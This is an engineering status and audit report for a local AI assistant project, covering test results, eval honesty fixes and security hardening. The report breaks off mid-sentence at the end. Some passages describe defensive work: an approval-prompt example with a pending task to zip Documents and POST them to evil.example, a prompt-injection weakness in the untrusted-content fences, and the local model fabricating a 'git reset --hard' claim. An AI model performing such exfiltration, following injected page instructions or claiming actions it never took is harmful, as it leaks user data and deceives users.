# BEE / Jarvis — Feature Status (authoritative)

**Date:** 2026-10-08 audit, **re-measured on this machine 2026-10-15** ·
**Basis:** independent acceptance audit
([JARVIS_ACCEPTANCE_AUDIT.md](JARVIS_ACCEPTANCE_AUDIT.md)) — source reads at
cited locations + test suites actually executed on this machine.

Legend:
- **GREEN** — verified working (source + tests +, where claimed, live run)
- **YELLOW** — implemented with known, documented limitations
- **RED** — incomplete / unverified / unsafe

Test basis (re-measured on this machine **2026-10-15**, after the A57–A64 pass):
`pytest tests -q` = **928 passed, 0 failed** — 105.8 s, then 94.4 s on the final
re-run after the docs sync (wall time drifts; the count did not) (`-m core` 849 selected /
79 deselected, `-m security` 135 — the marker registry is hand-kept, see the YELLOW
register) · `evals/verify_suite.py` = **ALL PASS**, 71,914 deterministic checks over
6 families, every accuracy 100 % with its 95 % CI lower bound printed.
Re-measured again **2026-10-17**, six times, after the approval-fix +
`bee4b-v2` pass, the teach-back/preference-pairs pass, the context-floor
pass, the provider-failover pass, the nightly-loop-close pass, and the
plan-first/SFT-parity pass (see the 2026-10-17 section at the bottom):
**1013 passed, 0 failed** in 109.3 s.
21-task agent eval, **one invocation, every task actually run**: **20/21** in
186.3 s (`evals/results_summary.json`, ts `2026-10-15T21:49:02`, `skipped: 0`,
`carried: 0`, `single_run: true`). The only failure is `dsa_lis` (30.8 s, missing
substring `'4'`) — answer quality on the local 3B model, not a missing mechanism.
The rows that flipped since the last recorded basis are `dsa_graph` and
`file_list_ws` — A59's 2026-10-13 run was **18/21** with `file_list_ws`, `dsa_lis`
and `dsa_graph` failing (and the older 2026-10-10 basis was 18/21 in 259.2 s with a
different trio). A59's mechanism deltas (the shipped `num_ctx` went from half a turn
to the whole turn: suite 516 s → 295 s, 70 → 46 model calls) are the part to trust,
because per-task outcomes on `bee4b` are stochastic and 20/21 is this invocation's
number, not a trend.
That number is now meaningful because of A52: the headline this suite used to print
was the latest row per task across *all history*, so a 1-task run reported "21/21
overall"; every score quoted here before 2026-10-10 came from that field and is not a
single-run result. A62 found the second half of the same lie — a task that never ran
was counted as a pass — and closed it in the runner, `REPORT.md`, `eval_resume.py`
and the J3 gate.
The score moves with
local-3B answer quality and is stochastic — what is *mechanism-level* stable is
the deterministic tier: `route_det_math` went from **36.9 s / 13 tool calls /
FAIL** to **0.0 s / 0 tool calls / PASS**, likewise `route_det_pct`, `math_repeat_stable`,
`math_basic`, `calculator` and `verify_calc_pass` (see A19, A21a), and now also
`memory_read` / `rag_gpu_memory` / `file_list_ws` / `specs` (A31, A32) and
`dsa_sort_check` — pasted code now executes instead of being described,
**32.6 s / 14 tool calls / FAIL → 0.1 s / 1 call / PASS** — and `dsa_lis`,
`dsa_gcd_lcm`, `dsa_graph` once code the model merely displayed is executed for real
(A34c, A34e) — and A45a, where the displayed snippet computed into variables and
printed nothing: `dsa_gcd_lcm` **40.3 s / 16 tool calls / FAIL → 25.4 s / 1 call /
PASS**, the values reported as measured (`gcd_value = 21`, `lcm_value = 588`) rather
than as the model's arithmetic.

## Post-audit fix pass (2026-10-08) — rows this document had wrong

A code sweep + live runs found 35 defect classes that the green suite was
certifying (see `TECHNICAL_DEBT.md` A1–A35 for evidence and regressions). Three
rows below were therefore **overclaimed** and are now corrected:

- **Emergency stop "3 mechanisms"** — the Ctrl+Alt+Q poller was never
  instantiated outside tests and five `computeruse.*` config keys were read by
  no code. It is now armed when the first desktop session is created (ctypes
  `GetAsyncKeyState`, `hotkey_state()` introspection, and an unavailable
  backend logs instead of pretending).
- **"Streaming TTS GREEN"** — the real `StreamingTTS` class had **zero** tests
  (the engine suite used `FakeTTS`, which set `busy` correctly and so hid the
  real class's race). Pinned by `tests/test_voice_tts.py` (14 tests).
- **"Event sources: timer + file_change end-to-end"** — no production path ever
  *started* a source, so the proactive layer could only fire from events
  published inside tests. `start_sources()` now runs on automation start, and
  **battery** (Windows power API) and **network** (TCP probe, no DNS) are real
  edge-triggered sources; **app_event** and **device_state** followed in A23a
  (5 of 6 real — **email** is the one source that remains schema-only).
- **"Offline deterministic tier / fast paths GREEN" (A19)** — `resolve_followup`
  merged any utterance of ≤4 words into the active task, and routing judged that
  *merged* string, so in any ongoing session "1234 + 5678" or "what time is it"
  lost its 0 ms handler (eval: 36.9 s and 13 tool calls for a sum). Complete
  requests now start a fresh task while real nudges ("Tomorrow.", "At 6pm
  instead") still merge, and routing judges the raw utterance (`route_text`).
- **Loop discipline (A20)** — the exact-args circuit breakers were sidestepped by
  a model varying one argument, so 12 of 25 iterations went to calls the
  capability gate would refuse; the gate also overwrote already-decided verdicts.
  Refusals are now counted per tool (6 asks → 2 gate consultations) and three in
  a row lock the tools so the remaining budget produces an honest answer.
- **Cancellation row** — the web UI now has a real mid-task stop:
  `POST /cancel` plus a Stop button / Esc in the chat page (previously "no cancel
  route, feature gap"). Kernel-owned task scope (N4) is what makes it leak-free.
- **Face row** — `/voice` (local realtime engine) now pushes its states through
  the same bridge LiveKit uses; the visualizer is no longer LiveKit-only, and a
  test pins that all 7 engine states map onto the face vocabulary.
- **Reminders (A24)** — BEE could store durable jobs but could not be *told*
  "remind me to stretch in 20 min": the only reminder surface accepted `HH:MM`
  or ISO, and its action was an `agent_task`, so a reminder needed a model to be
  awake at the moment it fired. Worse, `JobWorker._notify` toasted only
  `failure`/`missed`, so even a correctly-scheduled `notify` job "succeeded"
  into the store while the user waited. There is now `/remind` plus spoken fast
  paths over one deterministic grammar, delivering a `notify` job to the desktop;
  one `worker_now()` helper removed the second clock (`datetime.now()` on the
  creation side vs the worker's clock on the firing side). **Live**: set in
  10 ms with no LLM/network → fired from the durable store → `os_notify` True
  with exactly one popup → cancelled. (The live run is also what caught the
  double-toast the first version of the fix introduced.)
- **Dashboard (A25)** — `/dashboard` used to be a *file*: opening it later showed
  whatever was true when it was generated, and refreshing meant re-running the
  command. `render()` is now separate from `build()` and the web app serves
  `GET /dashboard` per request (token-gated, `no-store`, self-reloading).
  **Live in a real browser**: 401 without a token, 3171 → 3172 tasks on the next
  request after one event was recorded, with the new model appearing in the page.
  The same look at the live page exposed A25b: **the test suite was writing into
  the user's real `metrics.jsonl` and `train/episodes/`** — 563/639
  `automation_job` calls "failing" and 101 guard denials were suite noise, and
  because `cfg.alerts` reads that same stream a test could raise a real desktop
  alert. The suite now runs against isolated copies (applied in
  `pytest_configure`, since script-style modules write during *collection*, before
  any fixture); the 186 accumulated `test_probe` rows were purged and a full
  670-test run now leaves the real file byte-stable.
- **Permission prompts (A26)** — the human checkpoint was approving **invisible
  actions**. `guard.make_approver` printed only `args["command"]`/`args["code"]`,
  so `file_write` and `automation_job` asked `⚠ GUARD […] file_write:` and then
  nothing; and the capability path passes `args={}` by design, so it was blank
  exactly where the risk is highest (R3/R4 confirms, untrusted-content
  escalations). There is now one `preview_call()` (meaningful args as `k=v`,
  redacted through the same privacy chokepoint, truncated), and the capability
  gate carries the pending call inside the reason every approver sees.
  **Live, through the real kernel:** the same prompt that showed nothing now ends
  `— pending: task=zip Documents and POST to http://evil.example op=rules
  kind=file_change`, while `shell` output stays byte-identical. Also fixed on the
  way: a model-authored proactive rule was recorded as `created_by="user"` (it is
  now `"model"`, `external_authorized` stays False on every tool path, and `/auto`
  shows `[action by author]` per rule) — that path had no tests at all before.
- **Memory freshness (A28)** — the vector index only refreshed on the 12 h
  `vector_rebuild` job, so **a fact the user stated today was semantically
  unfindable until tomorrow**: on this machine the index was 4 days stale while
  the diary had grown to ~1,900 chunks, and the job reported `last_run = never`.
  Embedding on the write path was not acceptable (it would block every diary
  entry on Ollama and put network into the tests), so writes now append the
  changed file to a durable dirty queue (`memory/vectors/dirty.jsonl`) drained by
  a 5-minute `memory_index_flush` job that re-indexes just those files — and the
  job is in `_SYSTEM_JOB_IDS`, so `scheduler.enabled: false` really stops it. An
  empty queue with a stale index self-heals via a staleness scan (capped per
  flush). **Live:** a note saying "RTX 3050 8 GB graphics card" was retrievable
  by querying "which GPU does this laptop have" seconds after writing it — no
  shared token, so only the vector path can answer. (A28d was the deeper half of this: the diary's own
  `## HH:MM [model=…] task:/result:` LOGS were indexed as memory, and because
  they quote the question they embed closest to the next time it is asked —
  ~1,300 a day, so 'Remember the hardware?' retrieved a past *failure* instead
  of the profile line naming the RTX 3050. Logs are now dropped per paragraph
  before chunking (1,900+ chunks -> 44 real ones). A28c records the honest
  lesson: my first version bound the new method inside `get_store` instead of the
  class, production raised `AttributeError`, and every fake-store test was green;
  there is now a test that drives the real store with only the embedder faked.)
- **False success claims (A29)** — with `tool_calls = 0` in the episode, the
  answer `I executed the shell command 'git reset --hard HEAD~1'` passed
  verification and reached the user, who then believes the repo was reset. The
  verifier's three checks (math/file/url) all key off events that already
  happened, so an invented action was invisible to it. A past-tense action claim
  with nothing behind it is now a verification finding, and the loop gets one more
  turn through the loop's existing self-correction: do it, or say you didn't. Testing that
  surfaced two more halves of the same bug (A29d/A29e): 'did any tool run?' was far
  too weak a receipt — live, the model made 16 harmless tool calls and fabricated
  `git reset --hard HEAD~1` anyway — so a claim must now match something a tool
  result actually mentions; and a claim that stays unverified after the fix rounds
  was still returned as `ok=True`, so it now carries an explicit
  '⚠ I could not verify that this actually ran' and reports failure. The voice
  engine likewise no longer speaks an action claim until the verifier clears it,
  while plain answers keep streaming with no added latency.
- **Hallucinated skills (A30)** — `skill_create` wrote whatever the model asked
  for: a 3B model emitted `name="new_skill_name"` with an unfilled template as
  the content and the tool created that folder in the user's capability library.
  The J2 gate refuses to *ship* such a candidate but runs after the write, so the
  junk stayed and `/skills` listed it forever. Validation now happens before any
  directory is created (name shape, template-placeholder content, missing
  `description:`, non-compiling `script.py`), and a rejected call leaves nothing
  behind. Legitimate names still save exactly as before.
- **Loop thrash and pasted code that never ran (A34)** — a command that *executes and
  fails* was counted as success (`ok_flag` only looked for `error`/`blocked`), so the
  per-tool failure breaker never fired and one eval task burned **48 tool calls**
  re-running broken code with one character changed. Non-zero `exit_code` now feeds the
  breaker (without touching the execution-receipt semantics the verifier relies on), and
  each tool has a call budget: 6 attempts is a nudge that skips execution, 12 is a hard
  stop. `dsa_sort_check`/`dsa_graph` handed the assistant code verbatim and it replied by
  *writing* code — including `from bee_dsa import graphs`, a module that does not exist —
  so a `run_code` fast path now executes what the user pasted (guard + capability gate
  still applied, trailing prose after an em-dash stripped, failures reported as failures).
  Its follow-on (A34e) is the same rule aimed at the answer: when a task asks for a
  Python result and the reply only *displays* a snippet, that snippet is executed
  through the capability gate and the guard before delivery — three eval tasks that had
  been stating the model's mental arithmetic as computation now report real stdout, and
  a refused or failing snippet is labelled unverified instead of silent.
- **The loop's stop signals were not stops (A35)** — found only after I stopped
  trusting the aggregate score and dumped the per-call observation list for one run of
  the two 'stochastic' eval tasks. The repeat breaker answered an ignored
  `Do NOT run it again` with `ok=True`, so one model asked for the same planner call
  **21 more times** and burned 21 of 24 iterations; a third identical ask now closes
  the tools and jumps to the answer pass (`plan_complex` 23 tools → 7,
  `file_roundtrip` 16 tools → 6). Three more defects behind it: that same note
  overwrote the A34d plan relay with an empty plan, the honest fallback quoted a
  loop-control note as 'the last thing a tool returned', and malformed arguments were
  reported with `bad arguments for X:` twice.
- **Memory & answers about itself (A27)** — the remaining eval failures were not
  all model quality. **Semantic memory had never worked**: `_Semantic.search`
  called `rag.retrieve(query, k=)` against a `retrieve(ctx, query, k)` signature,
  and the bare `except` swallowed the resulting `TypeError`, so "what do I know
  about X?" returned nothing forever, silently. On top of that "Remember my GPU
  from last time?" **stored the question** instead of answering it; recall, once
  it worked, **quoted the assistant's own past wrong answers** out of the diary
  as fact; and a stored fact swallowed the following sentence
  (`"Neovim. Use the profile memory tool."` × 7 copies in the user's real store).
  Finally the loop was **shipping answers about its own plumbing** ("no function
  calls were provided for execution…") because the final-answer pass required
  `n_tool_calls > 0` and the wrap message talked only about the budget. Now:
  narrated calls get one nudge, meta-rambles force one tools-disabled pass that
  restates the user's request, and a real answer about tools is exempt.
  **Eval: 11/21 → 14/21** in the same session, `guard_blocked` included (it now
  really calls `shell` and really gets blocked). The suite also stopped writing
  into `memory/` — `store.json` and `metrics.jsonl` are byte-identical across a
  686-test run.
- **The eval was grading itself, and 'this machine' had no answer (A31/A32)** —
  every `python -m bee.cli eval` appended to the user's real `memory/store.json`,
  diary and vector index (`run_suite` now executes inside a temp copy; store hash
  unchanged across full runs). Spoken folder listings and
  *search-your-memory-for-X* phrasings had no deterministic path, so they went to
  the 3B model, which answered "I do not have direct access to hardware
  information" — the sentence the eval was written to catch. Nothing in the
  product could name the machine's GPU at all, so recall now reads it from CIM
  (`systemctl action=hardware`, cached; a `specs` fast path answers the same
  question in pure Python), quotes only the bullets that match the question,
  labels sources as `profile memory` instead of leaking `C:\Users\…` paths,
  collapses near-duplicate chunks, and flags a stored spec the hardware
  contradicts (note says 8 GB, this box reports 4 GB). Durable writes go through
  `md.add_facts`, which dedupes, updates a changed `Subject:` value instead of
  appending a third `- Hardware:` bullet, and rejects structure and the
  assistant's own task chatter — the pollution the measurement found in the
  user's own profile.
- **A 40-second task that ended by offering to help (A33)** — the tools-disabled
  wrap pass could itself reply with plumbing talk and that was shipped
  (`I'm ready to provide the response now…`); the fallback now quotes the last
  real tool result, or says plainly that it did not finish. Two follow-on
  findings from the next live run: `I ran out of steps` was matching the
  false-claim detector (so the honest message was retried for 80 s, and a
  budget-exhausted attempt is now final rather than re-burned), and the fallback
  was quoting the guard's own refusal JSON as if it were evidence.

- **Genuine streaming was broken in the no-litellm configuration (A37), and the
  primary embedding path had never worked (A38).** Every streaming test used a
  fake client with its own `chat_stream`, so the real `LLMClient` streaming path
  had never executed: `tools` was omitted at the one call site (→ `TypeError`
  re-raised as a generic `LLMError`, so **no token stream at all** when litellm is
  absent — the REPL, web SSE and voice surfaces), `httpx.Timeout(connect=, read=)`
  was invalid without a default, and the partial-recovery branch read
  `e._partial`, which nothing sets. `embed()` requested `ollama_chat/<model>` —
  unmapped for embeddings — and its `except: pass` dropped every batch into the
  native loop silently. **Live on the real `bee4b`/Ollama:** `LLMError: …
  _ollama_stream() missing 1 required positional argument: 'emitted'` →
  `tokens=2 content='STREAM OK' usage={'prompt': 146,'completion': 3}` in 0.2 s;
  embeddings now return 3×768-dim from the primary path in one call. Pinned by 7
  real-client tests (`tests/test_streaming_contract.py`) plus a static
  call-signature contract (`tests/test_static_contracts.py`, A37e) that also
  re-feeds the original A27a/A37a bugs into itself so it cannot pass by being
  unable to fire.

Also fixed and live-verified: the face page now authenticates (verified in a
real browser — it renders `thinking` + the utterance instead of sitting on
"idle" forever), edge-tts MP3 actually plays (real MP3 → exact-size WAV,
winsound accepts it), the app configures a logging handler at all (before: no
handler existed anywhere, so every quiet failure was invisible),
`num_ctx`/workspace resolution, seven dead config switches, and a web auth path
that answered 500 instead of 401 on a malformed header.

Historical basis (post-coherence-pass, superseded by the fix-pass numbers
above): `pytest tests -q` = 543 collected, **1 failing** (the ML pin-drift test,
A14) · verify_suite ALL PASS.

## Agent core

| Feature | Status | Note / limitation |
|---|---|---|
| Single Agent Kernel (state machine, receipts, telemetry) | GREEN | all surfaces (REPL/web/livekit/voice/jobs/proactive) run through it |
| ToolBus as execution dispatcher | GREEN (fixes F2 + N3 + N9) | loop dispatches via `bus.call`; **per-tool timeouts now enforced** (worker thread + `ToolTimeoutError`); full capability list per tool; planner validates against the same bus |
| Capability gate (task-scoped grants, fail-closed unattended) | GREEN | post F0 (N1): `/guard off` no longer disables it; post F1: sub-agents + clap inherit it |
| Fast-path catalog (46 handlers, count pinned by `test_docs_do_not_stale`) | YELLOW | deterministic + legacy-guard-checked, but **skips the capability gate by design** (user's own words, regex-fixed action set, pre-LLM — not model-reachable), except the `FastExec` paths (`files_list`, `specs`, `run_code`), which do go through the guard and the capability gate. Accepted design; documented here. |
| Verification-gated success (no false success) | GREEN | `verify_task` + per-tool effect checks; blind retry only on non-destructive steps |
| Cancellation (REPL Ctrl-C / "stop" / voice / job timeout) | GREEN | **kernel-owned task scope** (N4): every new task starts with a clean cancel event at `kernel.run`; jobs additionally swap a job-scoped event. Web has `POST /cancel` + Stop/Esc in the chat page (a pending approval wait is interruptible too); LiveKit still has no explicit *endpoint* — barge-in / "Stop." drive `kernel.cancel()`. |
| Crash recovery (J1 checkpoints + `/resume`) | GREEN | task-level resume with "do not redo executed steps" note |
| Provider abstraction (local Ollama + cloud kinds) | GREEN | one registry, one execution path; keys env-only, matched per provider |
| Local model server autostart (A60a) | GREEN (tests) / **not field-verified after a real reboot** | `bee/agent/localserver.py` boots from `cli.py:927-928` when `ollama.autostart: true`; background thread, one attempt per process, `grace()` (1.5 s) before the local route so a boot still in flight does not degrade the task, and a server BEE did not start is left alone. 15 autostart tests fake only `Popen` + `httpx.get` and launch nothing (`tests/test_localserver.py` has 21 in total, the rest are the compaction tests below); `offline_hint()`/`status()` are shown by the health surface. |
| Local context window end-to-end (A58/A59) | GREEN (live-measured) | `num_ctx` reaches litellm as a top-level kwarg and `keep_alive` via `extra_body` (the wire forms were measured against the server, not guessed); shipped window **8192** holds the largest measured real turn (7339 tokens) and is the largest one that stays fully resident on this 4 GB card. Every model-using eval task now delivers its whole prompt (was: 2050 of 5779 evaluated). |
| Prompt-budget history compaction (A60c) | GREEN, with a stated limit | `compact_messages()` drops the oldest tool-call/result pairs before Ollama silently truncates to `num_ctx / 2`; never touches system+task, keeps the 2 most recent pairs. Fires in production (measured: `dropped 2 messages (8523 -> 8434 est tokens)`). It now also reports `fits: False` when the fixed floor (30 tool schemas) keeps the turn over budget after all droppable history is gone — compaction cannot solve that turn, and says so instead of pretending. |
| Cloud-unavailable operation | GREEN (tested) / YELLOW (live) | fallback + deterministic floor verified with fake clients; live offline drill not performed in this audit |
| ML router | GREEN | optional; major-version incompatible artifact **refused** with a clear message; falls back to heuristics; per-class training report; pinned env |
| Offline deterministic tier (math/smalltalk/files) | GREEN | eval_safe AST calculator, fast paths, offline floor |
| Eval headline honesty (A52 → A62) | GREEN | `score` is the latest row **per task across all history** (a ledger) and is labelled as one; `run_score` is the invocation. A62 closed the second half of the same lie: a task that never ran (cloud down) was written `ok: True, skipped: True` and counted as a **pass**, so a 21-task run with 5 skips printed `21/21` *and* `single_run: true`. Skips are now in neither numerator nor denominator, are listed by id, forbid the `single_run` claim, and `REPORT.md`/`verify_suite` print the partial form instead of one bare number. The J3 gate refuses a candidate scored on fewer tasks than its baseline, and `eval_resume.py` compares by `ts` instead of file order. |
| Engine choice (hybrid / local / ollama-cloud / api-cloud) + persistence | GREEN (A41) | one canonical redirectable path (`paths.SETTINGS_JSON`, isolated by the suite); `save_engine` returns whether the write happened and the REPL / `POST /engine` report `persisted` separately from the in-session switch; unknown names and corrupt files log instead of silently reverting to hybrid. **Live through the real app:** blocked write → `{'ok': True, 'persisted': False}` + warning (was a silent `{"ok": true}`). |

## Memory & conversation

| Feature | Status | Note / limitation |
|---|---|---|
| Structured memory with provenance (source floors/caps, promotion guard) | GREEN | model_inference/web items can never silently become user facts |
| Corrupted-store resilience | GREEN (this audit) | garbage file → empty store; one bad row → good rows salvaged (8 new tests) |
| Session persistence + follow-up resolution | GREEN | "continue/new/cancel" + time nudges; "Remind me… → Tomorrow." = ONE rescheduled durable job |
| Planner (typed intent → validated plan before execution) | GREEN | impossible/ambiguous requests short-circuit without LLM; replans counted |
| Markdown memory (diary/lessons/profile/longterm) + RAG | GREEN | hybrid vector+keyword; vector rebuild is clear-before-add |
| Self-improvement flywheel (post-task reflection → lessons → next prompt) | GREEN (A40, live on `bee4b`) | now owned by the **kernel**, so web/voice/LiveKit/jobs/proactive learn too — previously only the REPL wrote lessons while all of them read them. `_usable()` gate rejects plumbing-ramble / self-machinery / all-empty lessons before any write (7 of the 23 real stored lessons would now be refused); cancelled tasks teach nothing; a failed write is logged, never claimed. Switch: `learning.reflect` (off in the eval so scored runs stay deterministic). |

## Scheduling & proactivity

| Feature | Status | Note / limitation |
|---|---|---|
| Durable scheduler (one Job model, UTC-canonical next_run, job timezone) | GREEN | restart restore with crash repair, no blind replay, file-claim single-flight; trigger math pure & tz-deterministic |
| `automation_job` create validation (A43) | GREEN | a trigger whose next fire cannot be computed is **refused** with the field and shape named (`at`/`time`/`days`/`every_seconds`), never stored as a live-but-deaf `pending/enabled/next_run=""` job; day names map to 0-6, unknown days and unknown kinds are refused; malformed numbers return a model-actionable message instead of `invalid literal for int() with base 10` |
| Eval + suite hermeticity (A44 → A57 → A61) | GREEN (hash-verified, pinned) | a scored run redirects memory **+ telemetry** (`metrics.jsonl`, `train/episodes/`, `skills/`) **+ workspace**, and disables reflection. Two more leaks closed since: **A57** — the kernel's own streams (`memory/receipts.jsonl`, `memory/sessions/`, `memory/checkpoints/`, `audit.jsonl`) were built from an unredirectable inline `PROJECT_ROOT`; they are `paths` constants now. **A61** — `train/` (episodes + `golden/cloud_golden.jsonl`) and `evals/results.jsonl` were never redirected at all, so *plain `pytest tests`* was writing the user's training corpus and score ledger. Both trees are redirected in `tests/conftest.py` (copied, not emptied), and `test_eval_hermeticity.py` hashes `audit.jsonl` / `results.jsonl` / `cloud_golden.jsonl` / the memory tree around a live run, so the claim cannot go stale silently. Historic residue removed reversibly (backups in `temp/*.before-a44-…`, `train/quarantine/`). |
| Training corpus honesty (A63) | **RED for the old corpus** / GREEN for the pipeline | `train/golden/cloud_golden.jsonl` held 208 rows and **5 distinct task strings**, all of them test fixtures or eval prompts — 186 × "write a one line poem about bees", 15 × "explain how a rainbow forms". The flywheel's input was a mirror of the test suite, and `build_sft` also hashed each task and trained on the **hash** as the prompt (measured: 9 of 9 emitted samples had a 32-char hex user message). Corpus quarantined, builder fixed, both pinned. Nothing has been trained on it (no `bee-8b` promoted). |
| Scheduled tasks through the kernel | GREEN | agent jobs + proactive tasks run `kernel.run` with fail-closed approver (only preapproved capabilities) |
| Proactive policy (default-deny, rate limits, quiet hours) | GREEN | no rule → no action; per-rule + global caps; quiet hours suppress non-critical pings |
| External side effects (auto email/whatsapp/sms) | GREEN (gate) / **must stay off by default** | require `external_authorized=True` per rule; default-deny enforced in `ProactivePolicy.check` |
| Event sources | GREEN (5 of 6) | started in production by `start_sources()`: timer, file_change (opt-in dir), battery, network, **app_event** (foreground/launch/close) and **device_state** (memory/disk pressure with hysteresis) — battery + device_state verified against live readings on this machine; calendar = ICS only; **email remains schema-only** ("unavailable", and `available_sources()` is cross-checked against what actually starts) |
| Wall-clock firing | YELLOW | logic is clock-injected & fully tested; real-time firing not CI-exercised |

## Voice

| Feature | Status | Note / limitation |
|---|---|---|
| Realtime VoiceEngine (6 states, VAD, partials, endpointing) | GREEN (synthetic) | wired into REPL voice (cli.py); engine + 32 tests green |
| Barge-in / "Stop." / interruption / task cancellation | GREEN (synthetic) | TTS torn down immediately, kernel task cancelled, state → LISTENING |
| Reconnect / mic & provider failure recovery | GREEN (synthetic) | capped exponential backoff + audio validation; ERROR auto-recover |
| Streaming TTS (edge-tts chunks) / STT (windowed partials, honest: faster-whisper is batch) | GREEN | no fake streaming in the response path (genuine provider streaming; STT partials documented as window re-transcription) |
| LiveKit transport | ENVIRONMENT-DEPENDENT | behind `VoiceTransport` (kernel never imports LiveKit); config+agent tests green; **room not verified in field**; room audio transits LiveKit Cloud (not "audio stays on machine") |
| Real mic / speakers / clap hardware | ENVIRONMENT-DEPENDENT | hardware path not exercised in this audit |

## Computer use

| Feature | Status | Note / limitation |
|---|---|---|
| Observe → act → re-observe → verify closed loop | GREEN (mocked UI) | per-action pre/post snapshots + `verify_action`; budget-bounded; action ids |
| Coordinate provenance (no stale pixels) | GREEN | coords must lie in a rect from the LAST observe; semantic targets resolved by the vision backend against a fresh snapshot; `model_raw` explicitly flagged for the risk layer |
| Safe action set (12 verbs) | GREEN | no financial/destructive/credential/download/executable verbs exist in `VERBS`; credential targets blocked by name |
| Emergency stop (independent of the LLM) | GREEN (mocked, A42) | 4 mechanisms: kernel cancel event, global registry stop, Ctrl+Alt+Q hotkey poller, and the `computer_stop` tool — which now requires **no** capability (it used to be gated behind `desktop.control`/ASK, so an unattended surface could be denied its own abort). Stops are per-task: the next task gets a clean session. |
| Argument-shape validation on computer actions | GREEN (A42b) | a string `keys` ("ctrl+s") is refused with the shape to send instead — it used to iterate and press six individual keys into the focused window while verification reported `verified: True`; `expected` must be an object, numeric-string coordinates are coerced and non-numeric refused. |
| Permissions for risky actions | GREEN | risk classification → kernel approver + capability gate (e2e test through the real kernel; **browser approval card fixed + re-proven live 2026-10-17** — the launchers had let an auto-deny kernel shadow the interactive one, see the 2026-10-17 pass below) |
| Privacy/retention (no typed text/clipboard/pixels/titles in logs; bounded screenshot ring) | GREEN | enforced in `privacy.py`, test-pinned |
| Vision layer (vendor-neutral `VisionBackend`) | YELLOW | `StructuralVision` (window rects) is the default; learned-vision backends are swappable but **not implemented** |
| Real display | ENVIRONMENT-DEPENDENT | `WindowsDesktop` mocked in tests/CI; supervised real-display session required before enabling unattended |

## Security

| Feature | Status | Note / limitation |
|---|---|---|
| SSRF protection (netguard), incl. redirect re-validation | GREEN | every hop re-validated; all DNS answers checked; scheme/host/IP/content-type/size policy; hermetic tests |
| Untrusted external content | GREEN | **unforgeable** sentinel fence (`untrusted_fence`: per-call nonce in both markers + any `<<<…>>>` inside the payload neutralized — the markers used to be constant, so a page could close its own fence and continue as trusted instructions); R2+ capabilities escalated to explicit ask after ingestion; pre-ingestion grants revoked |
| Prompt/tool injection | YELLOW | gate escalation + unforgeable wrapping + ToolBus registration (unregistered tools uncallable), now backed by a corpus (`tests/test_injection.py`: sentinel forgery, denied shell, path escape, unregistered tool, grant revocation, prompt-secret absence). Still no large adversarial corpus and no learned input classifier |
| Sandbox (Docker) for model-generated code | YELLOW | hardened flags verified in source; requires running Docker + built `bee-sandbox` image; boundary = Docker/WSL2 |
| Secrets hygiene | GREEN | env-only; secret scan over tracked files green; no `.env`/runtime data in the repo |
| Log redaction + rotation | GREEN | redaction at write chokepoints; JSONL streams size-capped with rotation |
| Sub-agent authorization | GREEN (this audit, fix F1) | spawn_task sub-context now inherits gate/task-id/cancel-event/guard-mode (regression test) |

## Reliability (tested scenarios)

Cloud unavailable · local model unavailable · tool failure · timeout ·
cancellation · verification failure · bounded retry · app/scheduler restart ·
network failure (voice reconnect) · malformed request · **corrupted memory**
· missing optional dependency — all covered by green tests (this audit's
matrix). Real-network/real-hardware versions: not exercised.

## RED (do not enable)

| Item | Why |
|---|---|
| Unattended real-display computer use | real `WindowsDesktop` path never verified on a live display; budget + gate exist but the ground truth is mocked |
| Auto external messaging (email/whatsapp/sms) from proactive rules | capability gate works, but no live channel integration is verified; keep `external_authorized` off until a channel is field-tested |
| "Production-ready" / multi-user claims | single-user localhost design; web bind is 127.0.0.1; no authn between users; the agent eval is now **20/21** on this machine (2026-10-15, one invocation, no skips) and the residual failure is answer quality on a 3B model, so the ceiling is the *model*, not the mechanism — but 21 scored tasks is not a production acceptance test |

## YELLOW register (honest limitations)

Fastpath gate-skip (design) · **email** is the one event source still schema-only
(timer / file_change / battery / network / app_event / device_state are live and
started in production — 5 of 6, see the Event sources row) · learned vision not
implemented (structural only) · wall-clock scheduler not CI-exercised · LiveKit has
no explicit cancel *endpoint* (interruption is owned by barge-in / "Stop." →
`kernel.cancel()`; the web UI got `POST /cancel` in this pass) · prompt-injection
corpus exists (`tests/test_injection.py`, 12 tests) but no large adversarial corpus /
no learned input classifier · `sys.argv` swap in the LiveKit worker (SDK
constraint — `run_app` has no argv parameter; scoped + `finally`-restored) ·
behavioral eval capped by the local model (J3 model-gate is the closure path) ·
autostart has never been exercised by a **real reboot** of this box (the state
machine is tested, the boot race is not).

New in the 2026-10-13 → 10-15 pass (each has an entry or an open item in
`TECHNICAL_DEBT.md`, none of them closed here on purpose):

- **A64** — `_golden()` stores the *kernel-augmented* prompt as the user's task, so a
  golden can begin with `## Conversation state (resolved by the kernel…)`; 5 of the
  208 quarantined rows were exactly that. The corpus is empty until this is decided.
- **Compaction has a floor it cannot move** — the live turn measured 8523 → 8434 est
  tokens against a 7168 budget (8192 − 1024): system prompt + 30 tool schemas are a
  fixed cost that no amount of history-dropping touches. It now *reports*
  `fits: False` instead of implying success; the real fix is fewer/leaner schemas per
  route (or retrieval), not another drop pass.
- **Gate seeding from a partial run** — the J3 gate refuses to *compare* across
  different task counts (A62), but a baseline *seeded* during a partial run still
  stores raw counts.
- **Marker registry drift** — `-m core` selects 849 of 928; `test_native`,
  `test_telemetry` and `test_monitor` are in no marker list at all, and
  `test_monitor.py` has no test functions (its `check()`s run at import, so it can
  only fail as a collect error). A gate on `-m core` is not a gate on the suite.
- **Docs quote suite sizes in prose** (`928`, `849`, `12 tests` above) and nothing
  pins them — every pass has to re-measure them by hand, which is what this pass did.
- Closed in earlier passes and still true: `tests/test_automation.py` load flake
  (N7 — idle is announced by the job thread, not sampled).

New in the 2026-10-17 pass — the browser approval card fires for real,
`bee4b-v2` exists, and the self-improvement flywheel starts collecting data:

- **Interactive web approval was unreachable in production; fixed and proven
  live** (`bee/webapp.py`, `bee/cli.py`, `bee/scheduler.py`, `bee/agent/loop.py`).
  The design (SSE `permission_request` card on /chat, timeout-deny, bearer-authed
  grant) was implemented and unit-tested, yet the real server showed no card:
  both launchers — `cli._web` (`python -m bee web`) and `webapp.get_ctx()` (bare
  `python -m bee.webapp`) — started automation **before** any kernel existed,
  and `start_automation` installs an auto-deny kernel on `ctx.kernel` when none
  is present; `get_kernel()` then silently reused it, so every gated call in the
  browser was denied without a human ever being asked. Both launchers now
  register the interactive kernel first and pass it in (scheduled jobs still
  fail closed: their threads carry no browser stream). The fastpath `FastExec`
  guard check now also receives the kernel approver instead of the mode
  default. **Live**: a /chat task that must `code_run("import os\nprint(os.getcwd())")`
